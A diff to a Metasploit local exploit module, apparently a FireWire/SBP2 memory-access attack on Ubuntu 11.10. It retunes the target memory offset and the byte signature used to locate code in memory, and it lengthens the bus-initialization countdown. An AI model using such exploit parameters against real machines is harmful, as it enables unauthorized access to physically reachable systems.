@@ -29,7 +29,9 @@ class Metasploit3 < Msf::Exploit::Local
 			'Arch'           => ARCH_X86,
 			'Targets'	=>
 				[
-					[ 'Ubuntu 11.10', { 'Offset' => 0x540, 'Signature' => "\x74\x1e\x89\x5c\x24\x04\xc7\x04\x24\x70\x73\x05\x08\xe8\x3e\x53\xff\xff\x83\xc4\x24\x31\xc0\x5b\x5e", 'Space' => 75 } ],
+					[ 'Ubuntu 11.10', { 'Offset' => 0x590, 'Signature' =>
+                       # "\x74\x1e\x89\x5c\x24\x04\xc7\x04\x24\x70\x73\x05\x08\xe8\x3e\x53\xff\xff\x83\xc4\x24\x31\xc0\x5b\x5e", 'Space' => 75 } ],
+                        "\x74\x1e\x89\x5c\x24\x04\xc7\x04\x24", 'Space' => 75 } ],
 					# [ 'Ubuntu 11.10', { 'Offset' => 0x4f2, 'Signature' => "8B430C8B501C895424048B40", 'Space' => 75 } ],
 				],
 			'DefaultTarget'	=> 0,
@@ -108,7 +110,7 @@ class Metasploit3 < Msf::Exploit::Local
         b.enable_sbp2()
 
         begin
-            for i in 3.downto(1)
+            for i in 4.downto(1)
                 puts "[+] Initializing bus and enabling SBP2, please wait %2d seconds or press Ctrl+C \r" % i; 
                 STDOUT.flush
                 sleep(1)
